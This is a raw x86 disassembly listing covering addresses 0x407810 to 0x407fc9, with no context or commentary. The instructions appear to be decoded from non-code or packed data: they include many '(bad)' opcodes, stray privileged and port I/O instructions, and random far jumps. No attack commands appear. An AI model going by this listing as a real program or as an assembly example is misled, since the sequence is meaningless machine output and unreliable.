  407810:	and    DWORD PTR [esp+eax*1-0x69],edi
  407814:	fistp  WORD PTR [esi+eiz*8+0x4f]
  407818:	loope  0x40784a
  40781a:	jmp    0x9b2a:0xaad924c
  407821:	fcom   DWORD PTR [esi]
  407823:	sbb    eax,eax
  407825:	bound  esp,QWORD PTR [edi]
  407827:	icebp  
  407828:	push   eax
  407829:	or     eax,0x7fbbdbf0
  40782e:	mov    ds:0x627bc27a,al
  407833:	retf   0x3219
  407836:	test   si,cx
  407839:	pop    edi
  40783a:	aad    0xf5
  40783c:	icebp  
  40783d:	or     eax,0xa818a76f
  407842:	pop    ebx
  407843:	xor    cl,BYTE PTR [ecx]
  407845:	repz or BYTE PTR [edx+0x29],dl
  407849:	mov    ecx,0xae07e233
  40784e:	mov    edx,0x67d0013f
  407853:	int3   
  407854:	repnz mov esp,0x26098ab4
  40785a:	mov    dl,0x25
  40785c:	and    eax,0x8d0dd7bc
  407861:	loopne 0x407897
  407863:	cld    
  407864:	div    ebp
  407866:	fimul  WORD PTR [esi+0x1bb64da4]
  40786c:	cmp    ecx,DWORD PTR ds:[eax+0x31]
  407870:	add    BYTE PTR ds:0xa51e76a0,0x63
  407877:	pop    ecx
  407878:	or     eax,0x394aee42
  40787d:	mov    cl,0x9d
  40787f:	outs   dx,BYTE PTR ds:[esi]
  407880:	pop    edx
  407881:	or     al,0x0
  407883:	in     eax,0x31
  407885:	jp     0x407902
  407887:	cs xchg esp,eax
  407889:	adc    eax,0xe5c82f81
  40788e:	mov    edi,0x228ee5b2
  407893:	mov    WORD PTR [esi+0x5],?
  407896:	jb     0x4078b5
  407898:	inc    edi
  407899:	retf   0x6a43
  40789c:	jl     0x4078a3
  40789e:	mov    WORD PTR [edi+eiz*4-0x6b],cs
  4078a2:	fst    QWORD PTR [ebx-0x24]
  4078a5:	fbstp  TBYTE PTR [esi]
  4078a7:	(bad)  
  4078a8:	sub    ah,BYTE PTR [esi+edx*2]
  4078ab:	add    DWORD PTR [ecx+0x32],ecx
  4078ae:	dec    ebp
  4078af:	test   BYTE PTR [edi+0x19],0xd0
  4078b3:	mov    eax,0x4415d21c
  4078b8:	pop    esp
  4078b9:	mov    eax,0x39dd9aae
  4078be:	pop    eax
  4078bf:	jp     0x407936
  4078c1:	outs   dx,BYTE PTR ds:[esi]
  4078c2:	outs   dx,DWORD PTR ds:[esi]
  4078c3:	out    dx,eax
  4078c4:	push   ds
  4078c5:	adc    eax,0x13
  4078c8:	loope  0x4078d0
  4078ca:	xor    BYTE PTR [esi-0x21d4687b],bh
  4078d0:	retf   0xdf58
  4078d3:	mov    ah,0x9
  4078d5:	pop    eax
  4078d6:	fadd   QWORD PTR [edi+0x7a]
  4078d9:	xchg   ebp,eax
  4078da:	cwde   
  4078db:	mov    ah,0x13
  4078dd:	mov    bl,0x6e
  4078df:	cs pop ds
  4078e1:	add    esp,edx
  4078e3:	cmp    bl,al
  4078e5:	cmp    eax,0x1be97284
  4078ea:	sti    
  4078eb:	and    ah,BYTE PTR [esi-0x53a1cdd8]
  4078f1:	retf   
  4078f2:	cmovno esp,DWORD PTR [ebp+0x5b828235]
  4078f9:	cmp    al,0x4a
  4078fb:	ja     0x40795c
  4078fd:	cmp    DWORD PTR [edi+eiz*2-0x58],ecx
  407901:	mov    bl,0xf8
  407903:	dec    ebp
  407904:	aam    0x1d
  407906:	ret    0x883a
  407909:	mov    es,WORD PTR [edi+0x46e9b665]
  40790f:	mov    DWORD PTR [ebp+0x71],0x381e2907
  407916:	xchg   edi,eax
  407917:	sti    
  407918:	in     eax,dx
  407919:	inc    edx
  40791a:	into   
  40791b:	out    dx,al
  40791c:	sbb    eax,0xfaeeb8a1
  407921:	push   ebx
  407922:	shr    DWORD PTR [esi+0x44],1
  407925:	adc    eax,0x60821b3c
  40792a:	mov    ds:0x1d9bc916,eax
  40792f:	mov    DWORD PTR ds:0xb31d00f6,edx
  407935:	mov    cl,0x60
  407937:	inc    ebx
  407938:	test   DWORD PTR [esi],ebp
  40793a:	outs   dx,DWORD PTR ds:[esi]
  40793b:	inc    ecx
  40793c:	sbb    eax,0xd822aa6d
  407941:	jno    0x40792c
  407943:	das    
  407944:	dec    ebx
  407945:	cmp    DWORD PTR fs:[eax-0x6d],edx
  407949:	xor    ah,al
  40794b:	mov    ds:0xe3c5670e,eax
  407950:	add    al,BYTE PTR [edi]
  407952:	cmp    DWORD PTR [edi],ecx
  407954:	sub    al,0xd5
  407956:	out    dx,al
  407957:	popf   
  407958:	shl    eax,0xc4
  40795b:	(bad)  
  40795c:	mov    al,ds:0x136f7280
  407961:	pop    edx
  407962:	push   0x79b24750
  407967:	dec    esi
  407968:	inc    edx
  407969:	jmp    0x4079cb
  40796b:	rcl    DWORD PTR ds:0xbf5cacb,0x63
  407972:	xchg   esp,esi
  407974:	xchg   esi,eax
  407975:	into   
  407976:	jl     0x407966
  407978:	push   ss
  407979:	mov    dl,0x2a
  40797b:	fistp  QWORD PTR [bp+si-0x2894]
  407980:	outs   dx,DWORD PTR ds:[esi]
  407981:	stos   BYTE PTR es:[edi],al
  407982:	mov    bl,0xe3
  407984:	xchg   ebx,eax
  407985:	loope  0x40793d
  407987:	lea    esi,[esi+0x1f00faaa]
  40798d:	adc    eax,0xbab33296
  407992:	(bad)  
  407993:	mov    ah,0x6f
  407995:	add    bl,BYTE PTR [eax+0x2a]
  407998:	mov    ah,0xb9
  40799a:	or     bh,dl
  40799c:	daa    
  40799d:	jae    0x407972
  40799f:	rol    DWORD PTR [eax],1
  4079a1:	push   edx
  4079a2:	push   ecx
  4079a3:	jg     0x4079a2
  4079a5:	mov    edx,0x8b5a40f8
  4079aa:	xlat   BYTE PTR ds:[ebx]
  4079ab:	(bad)  
  4079ac:	pop    ss
  4079ad:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079af:	test   eax,0x848f7b54
  4079b4:	push   eax
  4079b5:	nop
  4079b6:	pop    ebp
  4079b7:	arpl   WORD PTR [edi-0x2695fdc],di
  4079bd:	and    BYTE PTR [ecx+eax*4-0x30ff400f],dl
  4079c4:	xor    ebx,DWORD PTR [edx+eax*1]
  4079c7:	jno    0x407a48
  4079c9:	es inc esi
  4079cb:	inc    eax
  4079cc:	jmp    0x4079b6
  4079ce:	(bad)  
  4079cf:	iret   
  4079d0:	int    0x6d
  4079d2:	sbb    eax,0x425897ff
  4079d7:	jecxz  0x407a1b
  4079d9:	bound  ebp,QWORD PTR [esi]
  4079db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079dc:	sub    DWORD PTR [edi-0x630d44a5],ecx
  4079e2:	and    BYTE PTR [edx-0x869816c],bl
  4079e8:	retf   0x551d
  4079eb:	push   cs
  4079ec:	out    dx,eax
  4079ed:	dec    ebp
  4079ee:	in     eax,dx
  4079ef:	cwde   
  4079f0:	pushw  ds
  4079f2:	dec    esi
  4079f3:	xor    edi,edx
  4079f5:	jno    0x407a63
  4079f7:	test   ebp,ebx
  4079f9:	add    ebx,edi
  4079fb:	int    0x55
  4079fd:	retf   0x716
  407a00:	or     eax,0xea7c0017
  407a05:	mov    edi,0x44fb0fe2
  407a0a:	sar    DWORD PTR [edx-0x59],1
  407a0d:	push   0xffffffe3
  407a0f:	jp     0x4079dd
  407a11:	mov    cl,0x5f
  407a13:	rol    eax,cl
  407a15:	pop    edi
  407a16:	fiadd  WORD PTR [ebp+0x15]
  407a19:	pop    edx
  407a1a:	sbb    eax,0xe96733a
  407a1f:	jb     0x407a70
  407a21:	adc    al,0xbb
  407a23:	add    esi,DWORD PTR [esi+eiz*2-0x55]
  407a27:	fstp   TBYTE PTR [esp+ebp*2-0x9761d5b]
  407a2e:	out    0x58,al
  407a30:	xchg   BYTE PTR [edi],dh
  407a32:	add    eax,0x8258fc85
  407a37:	inc    ecx
  407a38:	push   esi
  407a39:	cmp    al,0x57
  407a3b:	in     al,dx
  407a3c:	repnz push 0xffffff94
  407a3f:	mov    ecx,DWORD PTR [edi]
  407a41:	imul   edi,DWORD PTR [ecx],0xaec2cb54
  407a47:	adc    BYTE PTR [edi],dh
  407a49:	xchg   DWORD PTR [ebx-0x4a],edx
  407a4c:	add    esi,edi
  407a4e:	aas    
  407a4f:	(bad)  
  407a50:	push   0x7ac6c1b2
  407a55:	sub    BYTE PTR [ecx+0x3d],dl
  407a58:	mov    edx,0xbd2640e9
  407a5d:	mov    bh,ch
  407a5f:	test   al,0x66
  407a61:	add    DWORD PTR [edi-0x55205437],eax
  407a67:	pop    ebp
  407a68:	ds push ds
  407a6a:	mov    eax,ds:0x542360ad
  407a6f:	adc    al,0x13
  407a71:	retf   0xe238
  407a74:	mov    dl,0x56
  407a76:	das    
  407a77:	cmp    BYTE PTR [ecx+0x65949878],dh
  407a7d:	mov    eax,0x3113b600
  407a82:	repnz mov edi,0xf2f13164
  407a88:	pop    ebp
  407a89:	call   0xeb293255
  407a8e:	inc    esi
  407a8f:	ds hlt 
  407a91:	dec    esi
  407a92:	das    
  407a93:	frstor [edi-0x3c]
  407a96:	fcmovnb st,st(1)
  407a98:	lds    ebx,FWORD PTR [ebp+eiz*2-0x26]
  407a9c:	cmp    DWORD PTR [eax-0x7125ab4a],ebx
  407aa2:	test   al,0x68
  407aa4:	int3   
  407aa5:	mov    dl,0xd9
  407aa7:	jle    0x407a85
  407aa9:	jp     0x407a50
  407aab:	outs   dx,DWORD PTR ds:[esi]
  407aac:	sub    DWORD PTR [ecx-0x6],ebx
  407aaf:	test   edi,esi
  407ab1:	mov    ss,WORD PTR [ebp+edi*2+0x426e3028]
  407ab8:	xchg   edx,eax
  407ab9:	mov    al,0x97
  407abb:	adc    al,0x6c
  407abd:	pop    ds
  407abe:	int    0x31
  407ac0:	shl    BYTE PTR [esi],1
  407ac2:	mov    al,ds:0xdaacdf3a
  407ac7:	mov    DWORD PTR [eax+0x43],ebp
  407aca:	mov    edi,0xf25de126
  407acf:	jle    0x407a77
  407ad1:	in     al,0x53
  407ad3:	push   ss
  407ad4:	push   eax
  407ad5:	sub    al,0x60
  407ad7:	rcl    eax,0x7f
  407ada:	add    bl,BYTE PTR [ecx-0x6]
  407add:	stos   DWORD PTR es:[edi],eax
  407ade:	xchg   DWORD PTR [ebx],ebp
  407ae0:	dec    ecx
  407ae1:	pop    ecx
  407ae2:	lahf   
  407ae3:	pop    es
  407ae4:	cmp    al,0x56
  407ae6:	and    DWORD PTR [eax-0x39e8c4fe],ebx
  407aec:	sub    ah,BYTE PTR [ebp+0x54]
  407aef:	loop   0x407b64
  407af1:	push   ebp
  407af2:	or     ah,dl
  407af4:	jmp    0x407b4e
  407af6:	xor    BYTE PTR [eax-0x245d83d3],ch
  407afc:	push   ebx
  407afd:	retf   
  407afe:	hlt    
  407aff:	push   ds
  407b00:	jnp    0x407b60
  407b02:	xor    esp,DWORD PTR [edi]
  407b04:	mov    esp,0xe39aadd
  407b09:	scas   al,BYTE PTR es:[edi]
  407b0a:	aad    0x3c
  407b0c:	out    dx,ax
  407b0e:	test   eax,0x7e1982a9
  407b13:	addr16 pushf 
  407b15:	mov    esi,0x4703e169
  407b1a:	les    esp,FWORD PTR [eax+0x6a60ba9e]
  407b20:	xor    bh,bl
  407b22:	arpl   WORD PTR [ebp+0x60b623da],si
  407b28:	outs   dx,BYTE PTR ds:[esi]
  407b29:	xor    BYTE PTR [ebx+0x6],0x4b
  407b2d:	jmp    0x5807:0x91a4d5a4
  407b34:	cmc    
  407b35:	lods   al,BYTE PTR ds:[esi]
  407b36:	xor    bh,bl
  407b38:	pop    ebp
  407b39:	iret   
  407b3a:	bound  edi,QWORD PTR ds:0xa948ac97
  407b40:	lods   al,BYTE PTR ds:[esi]
  407b41:	mov    esp,0xef8916cd
  407b46:	xchg   edi,eax
  407b47:	xchg   ecx,eax
  407b48:	push   0x948e74b2
  407b4d:	add    al,0xe0
  407b4f:	push   edx
  407b50:	push   ebx
  407b51:	push   esi
  407b52:	jp     0x407b9f
  407b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b55:	es scas eax,DWORD PTR es:[edi]
  407b57:	add    ebx,DWORD PTR [edx]
  407b59:	inc    edi
  407b5a:	pop    ebx
  407b5b:	or     edi,DWORD PTR [ecx+0x17]
  407b5e:	cs inc ebx
  407b60:	push   ecx
  407b61:	scas   eax,DWORD PTR es:[edi]
  407b62:	fucomp st(3)
  407b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b65:	(bad)  [edi-0x3702caa9]
  407b6b:	and    DWORD PTR [ecx-0x56f3a016],edi
  407b71:	pop    es
  407b72:	inc    esp
  407b73:	pop    ebx
  407b74:	pop    edi
  407b75:	jns    0x407bca
  407b77:	sti    
  407b78:	mov    ds,WORD PTR [ebx+edi*1-0x5c]
  407b7c:	loopne 0x407bfc
  407b7e:	cmp    BYTE PTR [ebx-0x10],bh
  407b81:	jp     0x407b9d
  407b83:	test   al,0x20
  407b85:	xchg   ebx,ebp
  407b87:	mov    eax,ds:0xae1ed577
  407b8c:	mov    ebx,0xa7e3833a
  407b91:	repz mov eax,0xfbd2c726
  407b97:	dec    esi
  407b98:	add    DWORD PTR [ebp+0x1b2224ad],ecx
  407b9e:	add    esp,DWORD PTR [edx-0xc]
  407ba1:	arpl   WORD PTR [ebp-0x1169c789],cx
  407ba7:	and    DWORD PTR ds:0xadeda960,esi
  407bad:	das    
  407bae:	pop    es
  407baf:	jnp    0x407bf7
  407bb1:	js     0x407b54
  407bb3:	pusha  
  407bb4:	call   0xd86c:0x4f15bd28
  407bbb:	and    BYTE PTR es:[edx],bl
  407bbe:	mov    al,ds:0x6acedb44
  407bc3:	out    dx,al
  407bc4:	sti    
  407bc5:	add    eax,0x79e02957
  407bca:	mov    DWORD PTR [edx],ebx
  407bcc:	add    eax,0xa796301e
  407bd1:	mov    eax,0x3b2e58c0
  407bd6:	inc    ecx
  407bd7:	xor    ch,BYTE PTR [ebp+0x2e]
  407bda:	mov    dl,0x9f
  407bdc:	cld    
  407bdd:	mov    bh,0xe1
  407bdf:	ss pop edx
  407be1:	or     DWORD PTR [esi-0x2731dbfa],esp
  407be7:	jns    0x407be3
  407be9:	call   0x94e2:0xbb0247c1
  407bf0:	pop    es
  407bf1:	aas    
  407bf2:	stos   BYTE PTR es:[edi],al
  407bf3:	mov    ah,0x33
  407bf5:	and    ebp,DWORD PTR [eax+0x7eddf940]
  407bfb:	and    al,0xa9
  407bfd:	fcomp  QWORD PTR [eax+edi*2+0x56]
  407c01:	dec    ebx
  407c02:	fbstp  TBYTE PTR ds:[esi-0x2e]
  407c06:	push   esp
  407c07:	or     al,ch
  407c09:	jbe    0x407c51
  407c0b:	ins    DWORD PTR es:[edi],dx
  407c0c:	sahf   
  407c0d:	into   
  407c0e:	cs into 
  407c10:	add    al,0x19
  407c12:	lahf   
  407c13:	or     DWORD PTR [edx*1+0x5edcae21],edi
  407c1a:	enter  0xd283,0xb3
  407c1e:	imul   edx,DWORD PTR [ecx+eiz*2+0x7d],0xffffffa1
  407c23:	inc    ebp
  407c24:	xor    DWORD PTR [eax],0x4
  407c27:	stc    
  407c28:	stos   BYTE PTR es:[edi],al
  407c29:	sub    eax,0xcb730051
  407c2e:	inc    eax
  407c2f:	dec    ecx
  407c30:	lahf   
  407c31:	nop
  407c32:	jge    0x407c15
  407c34:	xchg   DWORD PTR [edx],ebx
  407c36:	adc    BYTE PTR ds:0x97435452,0x61
  407c3d:	bound  edx,QWORD PTR [edx+0x9]
  407c40:	out    0xed,eax
  407c42:	(bad)  
  407c43:	jecxz  0x407c83
  407c45:	mov    eax,0x631e28f1
  407c4a:	xor    eax,0xb7f073f4
  407c4f:	enter  0x6b27,0xe6
  407c53:	xor    BYTE PTR [ebx-0x661026dc],0x7c
  407c5a:	add    eax,0x687319cb
  407c5f:	rcr    DWORD PTR [esi-0x52781527],0x4e
  407c66:	xchg   esi,eax
  407c67:	mov    eax,ds:0x39548228
  407c6c:	iret   
  407c6d:	dec    eax
  407c6e:	cmp    eax,0xf80d47e5
  407c73:	add    DWORD PTR [edi-0x4f],ebx
  407c76:	sbb    DWORD PTR [esi+eax*4+0x42],esi
  407c7a:	(bad)  [esi+0x3b]
  407c7d:	div    BYTE PTR [ecx]
  407c7f:	ins    BYTE PTR es:[edi],dx
  407c80:	shr    DWORD PTR [esi],1
  407c82:	cmp    ah,BYTE PTR [ebp-0x5d]
  407c85:	ret    0x5d5b
  407c88:	bound  eax,QWORD PTR [edi+0x8]
  407c8b:	mov    esi,0x7f66d16c
  407c90:	inc    eax
  407c91:	leave  
  407c92:	lahf   
  407c93:	enter  0x4881,0x61
  407c97:	push   eax
  407c98:	xor    ch,BYTE PTR [edi-0x1c11e4dc]
  407c9e:	lahf   
  407c9f:	std    
  407ca0:	cmp    eax,0xacf782ea
  407ca5:	or     bh,bh
  407ca7:	inc    esp
  407ca8:	push   es
  407ca9:	mov    eax,0xdad86c67
  407cae:	xchg   edi,eax
  407caf:	dec    edx
  407cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cb1:	int    0x4
  407cb3:	test   BYTE PTR [esi],0x4e
  407cb6:	push   ebp
  407cb7:	daa    
  407cb8:	sub    DWORD PTR [edx+0x70],0xd5d6fb3d
  407cbf:	sub    BYTE PTR [edi+0x418808d1],cl
  407cc5:	and    al,BYTE PTR [esi]
  407cc7:	mov    eax,0x7953817f
  407ccc:	xchg   esi,eax
  407ccd:	xchg   esi,eax
  407cce:	cs scas eax,DWORD PTR es:[edi]
  407cd0:	jmp    0xcb789cf5
  407cd5:	mov    DWORD PTR [ebp+0x5369276a],ebp
  407cdb:	xchg   BYTE PTR [esi],cl
  407cdd:	mov    edx,0x1d5a0511
  407ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ce3:	iret   
  407ce4:	cmp    dh,BYTE PTR [esi+0x29]
  407ce7:	rcr    DWORD PTR [esi-0x7f2dacd4],1
  407ced:	xchg   DWORD PTR [esi],esp
  407cef:	aad    0x69
  407cf1:	outs   dx,BYTE PTR ds:[esi]
  407cf2:	xor    al,0x69
  407cf4:	inc    edi
  407cf5:	dec    esi
  407cf6:	stc    
  407cf7:	mov    WORD PTR [esi-0x253cc4d8],fs
  407cfd:	inc    ebp
  407cfe:	mov    edx,DWORD PTR [edx+0x71]
  407d01:	add    DWORD PTR [ecx+0x0],0x6f
  407d05:	dec    ecx
  407d06:	or     DWORD PTR [eax],edi
  407d08:	stos   DWORD PTR es:[edi],eax
  407d09:	and    ch,0x30
  407d0c:	daa    
  407d0d:	push   edi
  407d0e:	(bad)  
  407d0f:	out    dx,eax
  407d10:	out    dx,al
  407d11:	mul    BYTE PTR [edi+0x23382231]
  407d17:	push   cs
  407d18:	sub    al,0x23
  407d1a:	fistp  DWORD PTR [esi+0x27]
  407d1d:	iret   
  407d1e:	fstp   DWORD PTR [ebx+esi*2-0x39]
  407d22:	jae    0x407d18
  407d24:	or     al,0x4d
  407d26:	push   ebp
  407d27:	sbb    al,BYTE PTR [edi+edx*1]
  407d2a:	(bad)  
  407d2b:	push   ecx
  407d2c:	mov    al,0x5a
  407d2e:	out    dx,eax
  407d2f:	mov    ds:0xc325e9d5,al
  407d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d35:	push   eax
  407d36:	loope  0x407ceb
  407d38:	fisttp DWORD PTR [ebx-0x51bec199]
  407d3e:	inc    edi
  407d3f:	push   ebp
  407d40:	in     al,dx
  407d41:	aaa    
  407d42:	retf   0x9fe7
  407d45:	mov    WORD PTR [eax+0x66],cs
  407d48:	mov    ?,WORD PTR [ecx+0xdb311bf]
  407d4e:	rol    BYTE PTR [ebx+0x55f305a9],cl
  407d54:	mov    al,0xd2
  407d56:	adc    BYTE PTR [edi],ah
  407d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d59:	(bad)  
  407d5a:	fnstsw WORD PTR [eax-0x21]
  407d5d:	inc    ebp
  407d5e:	inc    edx
  407d5f:	pushf  
  407d60:	ds or  al,0x73
  407d63:	push   es
  407d64:	lods   eax,DWORD PTR ds:[esi]
  407d65:	dec    ebx
  407d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d67:	add    DWORD PTR [esi],0x513c486e
  407d6d:	leave  
  407d6e:	push   cs
  407d6f:	or     DWORD PTR [edx+0x1],ecx
  407d72:	xchg   ebx,eax
  407d73:	mov    edi,0x76fc5b9d
  407d78:	push   ecx
  407d79:	push   esp
  407d7a:	jns    0x407dba
  407d7c:	adc    al,0x4a
  407d7e:	cmc    
  407d7f:	loop   0x407d6d
  407d81:	and    esi,DWORD PTR [edi+0x29]
  407d84:	ins    DWORD PTR es:[edi],dx
  407d85:	mov    dl,0x43
  407d87:	adc    ebx,DWORD PTR [esi-0x13]
  407d8a:	into   
  407d8b:	jns    0x407dd8
  407d8d:	xchg   BYTE PTR [ebx],bl
  407d8f:	jnp    0x407dd5
  407d91:	sbb    DWORD PTR [esi-0x1b],edi
  407d94:	mov    eax,0xbd08230d
  407d99:	cwde   
  407d9a:	pop    ds
  407d9b:	call   0x8f3e9580
  407da0:	adc    bl,BYTE PTR [ecx-0x80]
  407da3:	mov    esp,0x61c40cca
  407da9:	push   ebx
  407daa:	xchg   dl,ah
  407dac:	mov    bl,0x5b
  407dae:	mov    edx,0x9d97c567
  407db3:	or     dh,BYTE PTR [edi]
  407db5:	and    BYTE PTR [eax-0x26fabbed],0xad
  407dbc:	rcr    DWORD PTR [eax-0x6bd6bb00],cl
  407dc2:	dec    DWORD PTR [eax-0x55900e02]
  407dc8:	lds    eax,FWORD PTR [eax-0xd]
  407dcb:	push   ss
  407dcc:	dec    ebx
  407dcd:	add    BYTE PTR [ecx+0x29ccb72e],ch
  407dd3:	test   al,0x79
  407dd5:	pop    es
  407dd6:	jl     0x407d99
  407dd8:	dec    ecx
  407dd9:	(bad)  
  407dda:	sahf   
  407ddb:	jb     0x407e40
  407ddd:	or     dh,BYTE PTR cs:[eax-0x40]
  407de1:	in     eax,dx
  407de2:	pushf  
  407de3:	cwde   
  407de4:	jle    0x407e53
  407de6:	mov    WORD PTR [eax],?
  407de8:	push   esi
  407de9:	fadd   DWORD PTR [esi-0x2ad069c1]
  407def:	pop    esp
  407df0:	cwde   
  407df1:	dec    edi
  407df2:	fadd   QWORD PTR [edi]
  407df4:	fdivr  st,st(6)
  407df6:	outs   dx,BYTE PTR ds:[esi]
  407df7:	sbb    edi,DWORD PTR [esi+eiz*4+0x5d]
  407dfb:	js     0x407e79
  407dfd:	retf   0xb58a
  407e00:	xchg   ebx,eax
  407e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e02:	iret   
  407e03:	sbb    al,0x92
  407e05:	gs inc esp
  407e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e08:	pop    ss
  407e09:	cld    
  407e0a:	mov    ebx,esp
  407e0c:	lahf   
  407e0d:	jmp    0x40c:0x39757bc2
  407e14:	sub    al,0x22
  407e16:	test   BYTE PTR [esi+0x350a966b],bl
  407e1c:	inc    ecx
  407e1d:	pop    ds
  407e1e:	lds    eax,FWORD PTR [edx]
  407e20:	and    DWORD PTR gs:[ebp+0x5d],ecx
  407e24:	pop    ebp
  407e25:	in     al,dx
  407e26:	mov    cl,BYTE PTR [ecx+edx*8]
  407e29:	lahf   
  407e2a:	dec    ebx
  407e2b:	out    dx,al
  407e2c:	mov    ebx,cs
  407e2e:	jo     0x407de8
  407e30:	dec    ebx
  407e31:	ficom  DWORD PTR [esi+esi*2+0x2a]
  407e35:	and    edx,DWORD PTR [eax-0x5a]
  407e38:	inc    ebx
  407e39:	adc    BYTE PTR [ebx-0xc1a7f2],bl
  407e3f:	mov    ah,0x46
  407e41:	push   ecx
  407e42:	aad    0x77
  407e44:	mov    ds:0x82fa647e,eax
  407e49:	rcl    DWORD PTR [edx+ebx*4],0x3c
  407e4d:	in     al,0x67
  407e4f:	inc    ecx
  407e50:	rcr    esi,cl
  407e52:	dec    esi
  407e53:	mov    ebp,0xc2eee31e
  407e58:	push   esp
  407e59:	mov    ch,0x2
  407e5b:	pop    ecx
  407e5c:	adc    eax,0x4bbab71a
  407e61:	jl     0x407e74
  407e63:	in     eax,0xf1
  407e65:	out    0x9,al
  407e67:	mov    bl,0xb6
  407e69:	or     BYTE PTR [ebp-0x1311c835],0x23
  407e70:	cli    
  407e71:	retf   
  407e72:	repz int 0x5b
  407e75:	aaa    
  407e76:	popa   
  407e77:	pushf  
  407e78:	mov    eax,0x72689d40
  407e7d:	add    eax,0xe6ecc72
  407e82:	dec    edi
  407e83:	inc    DWORD PTR [esi]
  407e85:	mov    eax,0x847a474b
  407e8a:	jne    0x407e7c
  407e8c:	out    dx,eax
  407e8d:	and    edi,DWORD PTR [ecx-0x3aa0e4b9]
  407e93:	pavgb  mm2,mm4
  407e96:	add    al,0x6d
  407e98:	mov    cl,0x0
  407e9a:	sub    al,0x7c
  407e9c:	icebp  
  407e9d:	lahf   
  407e9e:	dec    ch
  407ea0:	das    
  407ea1:	push   esi
  407ea2:	xchg   DWORD PTR [ebx],esi
  407ea4:	shr    DWORD PTR [ebx+edx*1],1
  407ea7:	lods   eax,DWORD PTR ds:[esi]
  407ea8:	pushf  
  407ea9:	scas   eax,DWORD PTR es:[edi]
  407eaa:	inc    esp
  407eab:	aad    0x3f
  407ead:	es out 0x5c,al
  407eb0:	stc    
  407eb1:	bound  ebx,QWORD PTR ds:0xcc769ff7
  407eb7:	repnz xchg edx,eax
  407eb9:	jg     0x407ee9
  407ebb:	add    eax,0xe568aa3f
  407ec0:	mov    dh,0x2f
  407ec2:	mov    esp,0xf81023ba
  407ec7:	xchg   ebp,eax
  407ec8:	sub    bh,ah
  407eca:	ret    0xd306
  407ecd:	xchg   BYTE PTR [esi+0x309b149a],dh
  407ed3:	in     eax,dx
  407ed4:	shl    BYTE PTR [eax],1
  407ed6:	fadd   DWORD PTR ds:0x79bc064f
  407edc:	test   al,0xf5
  407ede:	push   es
  407edf:	int    0xfe
  407ee1:	sbb    edx,DWORD PTR [esi+0x4b]
  407ee4:	cmp    dh,BYTE PTR [edi]
  407ee6:	call   0x7533:0x7a27475a
  407eed:	ret    
  407eee:	pushf  
  407eef:	jmp    0x407f6a
  407ef1:	out    0x50,al
  407ef3:	ret    0xda57
  407ef6:	cs pop edx
  407ef8:	dec    eax
  407ef9:	mov    ch,0x9e
  407efb:	xlat   BYTE PTR ds:[ebx]
  407efc:	mov    edi,0x3013cbf2
  407f01:	iret   
  407f02:	xor    BYTE PTR [ebp+0x2f],dl
  407f05:	push   cs
  407f06:	lock and eax,0x34454cad
  407f0c:	out    0x97,al
  407f0e:	mov    al,ds:0x14a4d074
  407f13:	push   edx
  407f14:	cli    
  407f15:	sti    
  407f16:	and    DWORD PTR [edx+0x52],ebx
  407f19:	xor    al,0x83
  407f1b:	xchg   ah,ah
  407f1d:	scas   eax,DWORD PTR es:[edi]
  407f1e:	jg     0x407f2a
  407f20:	sti    
  407f21:	sbb    ch,al
  407f23:	cvttps2pi mm6,QWORD PTR [ecx]
  407f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f27:	lock mov gs,ebx
  407f2a:	dec    esp
  407f2b:	sub    BYTE PTR [edi-0x5c],ah
  407f2e:	les    edi,FWORD PTR [esi+0x7f]
  407f31:	test   esp,ebx
  407f33:	mov    eax,ds:0x75bae4e1
  407f38:	inc    eax
  407f39:	fwait
  407f3a:	xor    DWORD PTR [ebx],ecx
  407f3c:	ret    0x22ae
  407f3f:	nop
  407f40:	sub    DWORD PTR [eax+0x29abc20],ebx
  407f46:	outs   dx,DWORD PTR ds:[esi]
  407f47:	mov    BYTE PTR [esi-0x52b80cee],bl
  407f4d:	push   edi
  407f4e:	lahf   
  407f4f:	push   esi
  407f50:	test   eax,0x9d19e938
  407f55:	imul   esp,DWORD PTR [ecx-0x13],0x9dbebcf7
  407f5c:	mov    dh,0xd9
  407f5e:	or     bh,bl
  407f60:	inc    edx
  407f61:	lods   eax,DWORD PTR ds:[si]
  407f63:	adc    al,0xcf
  407f65:	mov    eax,ds:0xc2f31c69
  407f6a:	mov    bl,cl
  407f6c:	or     bh,ah
  407f6e:	loope  0x407fe8
  407f70:	add    eax,0xf62a4b38
  407f75:	push   ss
  407f76:	pop    edi
  407f77:	ja     0x407fef
  407f79:	into   
  407f7a:	arpl   si,sp
  407f7c:	outs   dx,BYTE PTR ds:[esi]
  407f7d:	pusha  
  407f7e:	mov    esi,0x70c33c3b
  407f83:	fmulp  st(0),st
  407f85:	push   eax
  407f86:	es mov cs,WORD PTR es:[ebp-0x49]
  407f8b:	stos   DWORD PTR es:[edi],eax
  407f8c:	jns    0x407f78
  407f8e:	call   0x42cfc8e6
  407f93:	mov    cl,0xe5
  407f95:	push   edx
  407f96:	sub    esp,esi
  407f98:	sar    dl,0xfb
  407f9b:	add    BYTE PTR [ecx],dl
  407f9d:	outs   dx,BYTE PTR ds:[esi]
  407f9e:	arpl   WORD PTR [ebx],bx
  407fa0:	lahf   
  407fa1:	cmp    al,0x82
  407fa3:	loopne 0x407fd3
  407fa5:	ret    
  407fa6:	repnz repz cmc 
  407fa9:	lds    esp,FWORD PTR [esi+0x3bf79bd6]
  407faf:	or     esi,DWORD PTR [ecx]
  407fb1:	add    esp,ecx
  407fb3:	sahf   
  407fb4:	out    dx,al
  407fb5:	jae    0x407f5d
  407fb7:	add    DWORD PTR [edi+0x487b7831],esp
  407fbd:	xchg   edi,eax
  407fbe:	or     ecx,DWORD PTR [eax+0x1e]
  407fc1:	pop    eax
  407fc2:	sbb    al,0x4b
  407fc4:	mov    esp,0x9da0da96
  407fc9:	(bad)  
